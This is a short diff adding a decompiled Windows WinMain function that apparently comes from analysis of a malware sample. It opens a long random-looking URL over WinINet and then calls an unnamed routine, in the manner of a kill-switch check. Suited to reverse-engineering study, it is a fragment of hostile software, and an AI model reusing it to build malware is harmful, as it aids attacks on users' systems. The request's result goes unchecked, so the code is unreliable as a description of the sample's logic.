@@ -1,0 +1,27 @@
+int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+  void *v4; // esi
+  CHAR szUrl[57]; // [esp+8h] [ebp-50h] BYREF
+  int v7; // [esp+41h] [ebp-17h]
+  int v8; // [esp+45h] [ebp-13h]
+  int v9; // [esp+49h] [ebp-Fh]
+  int v10; // [esp+4Dh] [ebp-Bh]
+  int v11; // [esp+51h] [ebp-7h]
+  __int16 v12; // [esp+55h] [ebp-3h]
+  char v13; // [esp+57h] [ebp-1h]
+
+  strcpy(szUrl, "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com");
+  v7 = 0;
+  v8 = 0;
+  v9 = 0;
+  v10 = 0;
+  v11 = 0;
+  v12 = 0;
+  v13 = 0;
+  v4 = InternetOpenA(0, 1u, 0, 0, 0);
+  InternetOpenUrlA(v4, szUrl, 0, 0, 0x84000000, 0);
+  InternetCloseHandle(v4);
+  InternetCloseHandle(0);
+  sub_408090();
+  return 0;
+}
